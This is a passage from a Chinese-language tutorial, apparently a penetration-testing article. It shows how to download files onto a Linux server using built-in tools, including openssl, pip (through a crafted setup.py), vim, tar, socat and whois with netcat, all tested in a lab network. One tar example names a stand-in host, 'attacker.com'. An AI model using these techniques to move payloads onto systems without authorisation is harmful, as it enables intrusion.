
文件传输成功。

  

##  **13、** ** **openssl****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并创建证书并启动监听

echo "get by openssl." > openssl.sent

openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
-nodes

openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < openssl.sent

![1615378482_6048b832f231a5ab8bad9.png!small?1615378554255](https://image.3001.net/images/20210310/1615378482_6048b832f231a5ab8bad9.png!small?1615378554255)

  

第二步，Linux服务器使用openssl从远程主机下载文件

openssl s_client -quiet -connect 192.168.43.237:12345 > openssl.get

![1615378489_6048b83991874576f98a1.png!small?1615378560722](https://image.3001.net/images/20210310/1615378489_6048b83991874576f98a1.png!small?1615378560722)

文件传输成功。

  

##  **14、** ** **php****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并启动web服务

echo "get by php." > php.sent

python3 -m http.server 8080

![1615378496_6048b8400f784f0a005ed.png!small?1615378567172](https://image.3001.net/images/20210310/1615378496_6048b8400f784f0a005ed.png!small?1615378567172)

  

第二步，Linux服务器使用php下载文件

export URL=http://192.168.43.237:8080/php.sent

export LFILE=php.get

php -r '$c=file_get_contents(getenv("URL"));file_put_contents(getenv("LFILE"),
$c);'

![1615378504_6048b8488bea16920f3b4.png!small?1615378575778](https://image.3001.net/images/20210310/1615378504_6048b8488bea16920f3b4.png!small?1615378575778)

文件传输成功。

  

##  **15、** ** **pip****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并启动web服务

echo "get by pip." > pip.sent

python3 -m http.server 8080

![1615378511_6048b84fd4ff79e145184.png!small?1615378583035](https://image.3001.net/images/20210310/1615378511_6048b84fd4ff79e145184.png!small?1615378583035)

  

第二步，Linux服务器使用pip下载文件

export URL=http://192.168.43.237:8080/pip.sent

export LFILE=/home/user1/pip.get

TF=$(mktemp -d)

echo 'import sys; from os import environ as e

if sys.version_info.major == 3: import urllib.request as r

else: import urllib as r

r.urlretrieve(e["URL"], e["LFILE"])' > $TF/setup.py

pip3 install $TF

![1615378518_6048b85650daa720ce2c3.png!small?1615378589597](https://image.3001.net/images/20210310/1615378518_6048b85650daa720ce2c3.png!small?1615378589597)

文件传输成功。

  

##  **16、** ** **python****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并启动web服务

echo "get by python." > python.sent

python3 -m http.server 8080

![1615378529_6048b861ad815628bf50c.png!small?1615378601057](https://image.3001.net/images/20210310/1615378529_6048b861ad815628bf50c.png!small?1615378601057)

  

第二步，Linux服务器使用python下载文件

export URL=http://192.168.43.237:8080/python.sent

export LFILE=python.get

python -c 'import sys; from os import environ as e

if sys.version_info.major == 3: import urllib.request as r

else: import urllib as r

r.urlretrieve(e["URL"], e["LFILE"])'

![1615378537_6048b8692bc7b1dca3fa9.png!small?1615378608337](https://image.3001.net/images/20210310/1615378537_6048b8692bc7b1dca3fa9.png!small?1615378608337)

文件传输成功。

  

##  **17、** ** **ruby****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并启动web服务

echo "get by ruby." > ruby.sent

python3 -m http.server 8080

![1615378543_6048b86f172e580eea5b0.png!small?1615378614162](https://image.3001.net/images/20210310/1615378543_6048b86f172e580eea5b0.png!small?1615378614162)

  

第二步，Linux服务器使用ruby下载文件

export URL=http://192.168.43.237:8080/ruby.sent

export LFILE=ruby.get

ruby -e 'require "open-uri"; download = open(ENV["URL"]);
IO.copy_stream(download, ENV["LFILE"])'

![1615378549_6048b87586996efb1b18b.png!small?1615378620618](https://image.3001.net/images/20210310/1615378549_6048b87586996efb1b18b.png!small?1615378620618)

文件传输成功。

  

##  **18、** ** **rvim****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

  

第一步，远程主机创建测试文件并启动web服务

echo "get by rvim." > rvim.sent

python3 -m http.server 8080

![1615378556_6048b87c6e0b5ff81416b.png!small?1615378627484](https://image.3001.net/images/20210310/1615378556_6048b87c6e0b5ff81416b.png!small?1615378627484)

  

第二步，Linux服务器使用rvim下载文件

export URL=http://192.168.43.237:8080/rvim.sent

export LFILE=rvim.get

rvim -c ':py import vim,sys; from os import environ as e

if sys.version_info.major == 3: import urllib.request as r

else: import urllib as r

r.urlretrieve(e["URL"], e["LFILE"])

vim.command(":q!")'

![1615378565_6048b88506f04af6768cd.png!small?1615378636301](https://image.3001.net/images/20210310/1615378565_6048b88506f04af6768cd.png!small?1615378636301)文件传输成功。

  

##  **19、** ** **scp****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并启动SSH服务

echo "get by scp." > /home/user1/scp.sent

sudo systemctl start sshd

![1615378576_6048b890f11dfaec94629.png!small](https://image.3001.net/images/20210310/1615378576_6048b890f11dfaec94629.png!small)

  

第二步，Linux服务器使用scp下载文件

scp user1@192.168.43.237:/home/user1/scp.sent /home/user1/scp.get

![1615378597_6048b8a57f90308774b0a.png!small?1615378668948](https://image.3001.net/images/20210310/1615378597_6048b8a57f90308774b0a.png!small?1615378668948)

文件传输成功。

  

##  **20、** ** **sftp****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并运行SSH服务、启用SFTP

echo "get by sftp." > /home/sftp/ftpuser1/sftp.sent

systemctl start sshd

![1615378606_6048b8ae766744fd9b384.png!small?1615378677546](https://image.3001.net/images/20210310/1615378606_6048b8ae766744fd9b384.png!small?1615378677546)

  

第二步，Linux服务器使用sftp下载文件

sftp ftpuser1@192.168.43.237

get sftp.sent sftp.get

![1615378612_6048b8b494526f11281ee.png!small?1615378683602](https://image.3001.net/images/20210310/1615378612_6048b8b494526f11281ee.png!small?1615378683602)

文件传输成功。

  

##  **21、** ** **smbclient****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并启动smb共享

echo "get by smbclient." > smbclient.sent

sudo smbserver.py tmp ./

![1615378624_6048b8c05cdb4e291f63d.png!small?1615378695474](https://image.3001.net/images/20210310/1615378624_6048b8c05cdb4e291f63d.png!small?1615378695474)

  

第二步，Linux服务器使用smbclient下载文件

smbclient '\\\192.168.43.237\TMP' -c 'get smbclient.sent smbclient.get'

![1615378631_6048b8c779d0b61e7d0a6.png!small?1615378702535](https://image.3001.net/images/20210310/1615378631_6048b8c779d0b61e7d0a6.png!small?1615378702535)

文件传输成功。

  

##  **22、** ** **socat****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并运行socat监听端口

echo "get by socat." > socat.sent

socat -u file: socat.sent tcp-listen:12345,reuseaddr

![1615378665_6048b8e93749bfeee04ab.png!small?1615378736231](https://image.3001.net/images/20210310/1615378665_6048b8e93749bfeee04ab.png!small?1615378736231)

  

第二步，Linux服务器运行socat下载文件

socat -u tcp-connect:192.168.43.237:12345 open:socat.get,creat

![1615378672_6048b8f09491a5253f4ab.png!small?1615378743700](https://image.3001.net/images/20210310/1615378672_6048b8f09491a5253f4ab.png!small?1615378743700)

文件传输成功。

  

##  **23、** ** **ssh****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并运行SSH服务

echo "get by ssh." > /home/user1/ssh.sent

sudo systemctl start sshd

![1615378682_6048b8fabf8f027e12b3e.png!small?1615378753745](https://image.3001.net/images/20210310/1615378682_6048b8fabf8f027e12b3e.png!small?1615378753745)

  

第二步，Linux服务器使用ssh下载文件

ssh 192.168.43.237 "cat /home/user1/ssh.sent" > ssh.get

![1615378690_6048b902703e71c2c82e7.png!small?1615378761626](https://image.3001.net/images/20210310/1615378690_6048b902703e71c2c82e7.png!small?1615378761626)

文件传输成功。

  

##  **24、** ** **tar****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并运行SSH服务

echo "get by tar." > tar.sent

tar cvf tar.sent.tar tar.sent

sudo systemctl start sshd

![1615378704_6048b9104337421249975.png!small?1615378775344](https://image.3001.net/images/20210310/1615378704_6048b9104337421249975.png!small?1615378775344)

  

第二步，Linux服务器使用tar下载文件

RHOST=attacker.com

RUSER=root

RFILE=/tmp/file_to_get.tar

tar xvf $RUSER@$RHOST:$RFILE --rsh-command=/bin/ssh

tar xvf user1@192.168.43.237:/home/user1/tar.sent.tar --rsh-command=/bin/ssh

![1615378722_6048b92219c72a241a2ac.png!small?1615378793182](https://image.3001.net/images/20210310/1615378722_6048b92219c72a241a2ac.png!small?1615378793182)

文件传输成功。

  

##  **25、** ** **tftp****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并运行TFTP服务

mkdir /tmp/backup //创建目录

echo "get by tftp." > /tmp/backup/tftp.sent

chmod 777 /tmp/backup //修改权限

sudo atftpd --daemon --port 69 /tmp/backup //启动服务程序

![1615378731_6048b92bb12dd1e69e00d.png!small?1615378802688](https://image.3001.net/images/20210310/1615378731_6048b92bb12dd1e69e00d.png!small?1615378802688)

  

第二步，Linux服务器使用tftp下载文件

tftp 192.168.43.237

get tftp.sent tftp.get

quit

![1615378739_6048b9335401bee03c0b3.png!small?1615378810394](https://image.3001.net/images/20210310/1615378739_6048b9335401bee03c0b3.png!small?1615378810394)文件传输成功。

  

##  **26、** ** **vim****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并启动web服务

echo "get by vim." > vim.sent

python3 -m http.server 8080

![1615378752_6048b940b8dc82c5906ff.png!small?1615378823789](https://image.3001.net/images/20210310/1615378752_6048b940b8dc82c5906ff.png!small?1615378823789)

  

第二步，Linux服务器使用vim下载文件

export URL=http://192.168.43.237:8080/vim.sent

export LFILE=vim.get

vim -c ':py import vim,sys; from os import environ as e

if sys.version_info.major == 3: import urllib.request as r

else: import urllib as r

r.urlretrieve(e["URL"], e["LFILE"])

vim.command(":q!")'

![1615378760_6048b948c1949453df055.png!small?1615378831874](https://image.3001.net/images/20210310/1615378760_6048b948c1949453df055.png!small?1615378831874)

文件传输成功。

  

##  **27、** ** **wget****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并启动web服务

echo "get by wget." > wget.sent

python3 -m http.server 8080

![1615378773_6048b955ee772943375bc.png!small?1615378845191](https://image.3001.net/images/20210310/1615378773_6048b955ee772943375bc.png!small?1615378845191)

  

第二步，Linux服务器使用wget下载文件

wget http://192.168.43.237:8080/wget.sent -O wget.get

![1615378779_6048b95b55d7d0764745d.png!small?1615378850611](https://image.3001.net/images/20210310/1615378779_6048b95b55d7d0764745d.png!small?1615378850611)

文件传输成功。

  

##  **28、** ** **whois****

使用下面的命令将文件从远程主机下载到Linux服务器本地：

第一步，远程主机创建测试文件并运行netcat监听端口

echo "get by whois." > whois.sent

nc -l -p 12345 < whois.sent

![1615378790_6048b966a270ba5f84865.png!small?1615378861667](https://image.3001.net/images/20210310/1615378790_6048b966a270ba5f84865.png!small?1615378861667)

  

第二步，Linux服务器使用whois下载文件

whois -h 192.168.43.237 -p 12345 '任意字符串' > whois.get

![1615378797_6048b96db62162e5af35f.png!small?1615378868742](https://image.3001.net/images/20210310/1615378797_6048b96db62162e5af35f.png!small?1615378868742)文件传输成功。

  

或者使用下面的方法：

第一步，远程主机运行netcat监听端口

echo "get by whois again." > whois.sent

base64 "whois.sent" | nc -l -p 12345

![1615378807_6048b977975f030e568d9.png!small?1615378878677](https://image.3001.net/images/20210310/1615378807_6048b977975f030e568d9.png!small?1615378878677)

  

第二步，Linux服务器使用whois下载文件

whois -h 192.168.43.237 -p 12345 "abc" | base64 -d > whois.get

![1615378814_6048b97e6bbdd73892132.png!small?1615378886247](https://image.3001.net/images/20210310/1615378814_6048b97e6bbdd73892132.png!small?1615378886247)

"abc"为任意字符，必须输入，不输入则报错。

文件传输成功。

